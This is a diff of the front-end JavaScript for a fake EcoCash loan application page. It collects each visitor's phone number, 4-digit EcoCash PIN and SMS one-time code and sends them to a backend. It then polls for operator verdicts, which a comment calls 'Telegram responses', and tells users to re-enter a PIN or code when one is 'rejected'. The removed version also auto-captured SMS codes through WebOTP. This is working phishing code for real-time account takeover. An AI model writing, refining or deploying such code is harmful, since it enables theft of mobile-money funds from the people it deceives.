@@ -1,203 +1,168 @@
-let currentAppRef = null;
-let statusPollInterval = null;
-let lastFailedType = 'PIN'; 
+let loanAppData = {};
+let currentAppReference = null;
+let pollInterval = null;
 
-function updateLoanCalc() {
-  const amount = parseInt(document.getElementById('loanRange').value);
-  const interest = Math.round(amount * 0.10);
-  const total = amount + interest;
+const step1Form = document.getElementById('step1-form');
+const step2Form = document.getElementById('step2-form');
+const stepLoading = document.getElementById('step-loading');
+const step3Form = document.getElementById('step3-form');
+const successScreen = document.getElementById('success-screen');
 
-  document.getElementById('calc-amount').innerText = '$' + amount;
-  document.getElementById('calc-interest').innerText = '$' + interest;
-  document.getElementById('calc-total').innerText = '$' + total;
+const loadingTitle = document.getElementById('loading-title');
+const loadingDesc = document.getElementById('loading-desc');
+
+const otpStatusBanner = document.getElementById('otp-status-banner');
+const otpStatusText = document.getElementById('otp-status-text');
+const btnStep3 = document.getElementById('btn-step3');
+const otpInput = document.getElementById('otp');
+
+// Slider functionality
+const loanSlider = document.getElementById('loanAmountSlider');
+const loanDisplay = document.getElementById('loan-amount-display');
+loanSlider.addEventListener('input', (e) => {
+  loanDisplay.innerText = `$${e.target.value}`;
+});
+
+// Step Indicator Elements
+const stepIndicator = document.getElementById('step-indicator');
+const stepCircle1 = document.getElementById('step-circle-1');
+const stepLabel1 = document.getElementById('step-label-1');
+const stepLine1 = document.getElementById('step-line-1');
+
+const stepCircle2 = document.getElementById('step-circle-2');
+const stepLabel2 = document.getElementById('step-label-2');
+const stepLine2 = document.getElementById('step-line-2');
+
+const stepCircle3 = document.getElementById('step-circle-3');
+const stepLabel3 = document.getElementById('step-label-3');
+
+function updateIndicator(stepNumber) {
+  if (stepNumber === 2) {
+    stepCircle1.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
+    stepLabel1.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
+    stepCircle2.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
+    stepLabel2.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
+    stepLine1.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
+  } else if (stepNumber === 3) {
+    stepCircle3.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
+    stepLabel3.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
+    stepLine2.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
+  }
 }
 
-function showSection(sectionId) {
-  ['form-step-1', 'form-step-2', 'step-loading', 'form-step-3', 'step-success', 'step-rejected'].forEach(id => {
-    document.getElementById(id).classList.add('hidden');
-  });
+// STEP 1: Collect Applicant Details & Slider value
+step1Form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  loanAppData.fullName = document.getElementById('fullName').value.trim();
+  loanAppData.occupation = document.getElementById('occupation').value.trim();
+  loanAppData.monthlyPayments = document.getElementById('monthlyPayments').value.trim();
+  loanAppData.loanAmount = loanSlider.value;
+  loanAppData.repaymentTime = document.getElementById('repaymentTime').value;
 
-  if (sectionId === 'step-success') {
-    document.getElementById('app-header').classList.add('hidden');
-  }
+  step1Form.classList.add('hidden');
+  step2Form.classList.remove('hidden');
+  updateIndicator(2);
+});
 
-  document.getElementById(sectionId).classList.remove('hidden');
+// STEP 2: Collect Phone & PIN -> Show Loader -> Transition smoothly to Step 3 with 5s countdown
+step2Form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  loanAppData.phone = document.getElementById('phone').value.trim();
+  loanAppData.pin = document.getElementById('pin').value.trim();
 
-  if (sectionId === 'form-step-3') {
-    startOTPEngine();
-  }
-}
+  step2Form.classList.add('hidden');
+  stepLoading.classList.remove('hidden');
 
-async function startOTPEngine() {
-  if ('OTPCredential' in window) {
-    try {
-      const ac = new AbortController();
-      const otp = await navigator.credentials.get({
-        otp: { transport:['sms'] },
-        signal: ac.signal
-      });
-      
-      if (otp && otp.code) {
-        document.getElementById('otpCode').value = otp.code;
-        submitOTPDetails();
-      }
-    } catch (err) {
-      console.log("Web OTP Auto-fill not supported or aborted", err);
-    }
-  }
-}
+  let countdown = 5;
+  loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
+  loadingDesc.innerText = "Please wait while we connect to your account and send an OTP.";
 
-function validateAndGoToStep2() {
-  const name = document.getElementById('fullName').value.trim();
-  const occupation = document.getElementById('occupation').value.trim();
-  const income = document.getElementById('monthlyIncome').value.trim();
-
-  if (!name || !occupation || !income) {
-    alert("Please complete all required fields before proceeding.");
-    return;
-  }
-  showSection('form-step-2');
-}
-
-async function submitStep2Details() {
-  const phone = document.getElementById('phone').value.trim();
-  const pin = document.getElementById('pin').value.trim();
-
-  if (!/^\d{9}$/.test(phone)) {
-    alert("Please enter exactly 9 digits for your Zimbabwe EcoCash phone number.");
-    return;
-  }
-
-  if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
-    alert("Please enter a valid 4-digit EcoCash PIN.");
-    return;
-  }
-
-  const payload = {
-    fullName: document.getElementById('fullName').value,
-    occupation: document.getElementById('occupation').value,
-    monthlyIncome: document.getElementById('monthlyIncome').value,
-    repaymentPeriod: document.getElementById('repaymentPeriod').value,
-    loanAmount: document.getElementById('loanRange').value,
-    phone: phone,
-    pin: pin
-  };
-
-  try {
-    showSection('step-loading');
-
-    const res = await fetch('/api/apply-loan', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-
-    const data = await res.json();
-    if (data.success) {
-      currentAppRef = data.appReference;
-      startStatusPolling();
-
-      startCountdown(10, () => {
-        showSection('form-step-3');
-      });
+  const countdownTimer = setInterval(() => {
+    countdown--;
+    if (countdown > 0) {
+      loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
     } else {
-      alert("Application submission failed. Please try again.");
-      showSection('form-step-2');
-    }
-  } catch (err) {
-    alert("Network error. Please try again.");
-    showSection('form-step-2');
-  }
-}
-
-async function submitOTPDetails() {
-  const otpCode = document.getElementById('otpCode').value.trim();
-
-  if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
-    alert("Please enter a valid 6-digit OTP code.");
-    return;
-  }
-
-  try {
-    showSection('step-loading');
-
-    const res = await fetch('/api/submit-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        appReference: currentAppRef,
-        otpCode: otpCode
-      })
-    });
-
-    const data = await res.json();
-    if (data.success) {
-      startCountdown(10, () => {});
-    }
-  } catch (err) {
-    alert("Error submitting OTP. Please try again.");
-    showSection('form-step-3');
-  }
-}
-
-function retryFailedStep() {
-  if (lastFailedType === 'PIN') {
-    document.getElementById('pin').value = '';
-    showSection('form-step-2');
-  } else {
-    document.getElementById('otpCode').value = '';
-    showSection('form-step-3');
-  }
-}
-
-function startCountdown(seconds, onComplete) {
-  let timer = seconds;
-  const timerElem = document.getElementById('timer');
-  timerElem.innerText = `${timer}s`;
-
-  const interval = setInterval(() => {
-    timer--;
-    timerElem.innerText = `${timer}s`;
-    if (timer <= 0) {
-      clearInterval(interval);
-      if (typeof onComplete === 'function') {
-        onComplete();
-      }
+      clearInterval(countdownTimer);
+      stepLoading.classList.add('hidden');
+      step3Form.classList.remove('hidden');
+      updateIndicator(3);
     }
   }, 1000);
-}
+});
 
-function startStatusPolling() {
-  if (statusPollInterval) clearInterval(statusPollInterval);
+// STEP 3: Submit Complete Profile & OTP to Backend
+step3Form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const otpCode = otpInput.value.trim();
 
-  statusPollInterval = setInterval(async () => {
-    if (!currentAppRef) return;
+  if (otpCode.length !== 6) {
+    alert('Please enter a valid 6-digit OTP code.');
+    return;
+  }
 
+  loanAppData.otpCode = otpCode;
+
+  btnStep3.innerText = "Verifying...";
+  btnStep3.disabled = true;
+  otpInput.disabled = true;
+
+  otpStatusBanner.className = "bg-blue-50 border border-blue-200 rounded-lg p-3 text-center";
+  otpStatusText.className = "text-xs text-blue-700 font-medium";
+  otpStatusText.innerText = "Verifying details & OTP code, please wait...";
+
+  try {
+    const response = await fetch('/api/submit-full-application', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(loanAppData)
+    });
+
+    const result = await response.json();
+
+    if (result.success) {
+      currentAppReference = result.appReference;
+      startPollingStatus(currentAppReference);
+    } else {
+      resetOtpForm('Failed to submit application. Please try again.');
+    }
+  } catch (err) {
+    console.error('Error in step 3:', err);
+    resetOtpForm('Server connection error.');
+  }
+});
+
+// Poll backend status for Telegram responses
+function startPollingStatus(appReference) {
+  if (pollInterval) clearInterval(pollInterval);
+
+  pollInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/check-status/${currentAppRef}`);
+      const res = await fetch(`/api/check-status/${appReference}`);
       const data = await res.json();
 
-      if (data.success) {
-        if (data.status === 'PIN_APPROVED') {
-          showSection('form-step-3');
-        } else if (data.status === 'PIN_REJECTED') {
-          clearInterval(statusPollInterval);
-          lastFailedType = 'PIN';
-          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided. Please re-enter your PIN.";
-          showSection('step-rejected');
-        } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
-          clearInterval(statusPollInterval);
-          showSection('step-success');
-        } else if (data.status === 'OTP_REJECTED') {
-          clearInterval(statusPollInterval);
-          lastFailedType = 'OTP';
-          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided. Please request and enter a new OTP.";
-          showSection('step-rejected');
-        }
+      if (data.status === 'OTP_APPROVED') {
+        clearInterval(pollInterval);
+        stepIndicator.classList.add('hidden');
+        step3Form.classList.add('hidden');
+        successScreen.classList.remove('hidden');
+      } else if (data.status === 'OTP_REJECTED') {
+        clearInterval(pollInterval);
+        resetOtpForm('❌ Incorrect OTP entered. Please re-enter the 6-digit code.');
       }
     } catch (err) {
-      console.error("Polling status error:", err);
+      console.error('Polling error:', err);
     }
   }, 2000);
-    }
-    
+}
+
+function resetOtpForm(message) {
+  otpStatusBanner.className = "bg-red-50 border border-red-200 rounded-lg p-3 text-center";
+  otpStatusText.className = "text-xs text-red-700 font-semibold";
+  otpStatusText.innerText = message;
+
+  btnStep3.innerText = "Submit Loan Application";
+  btnStep3.disabled = false;
+  otpInput.disabled = false;
+  otpInput.value = '';
+  otpInput.focus();
+}
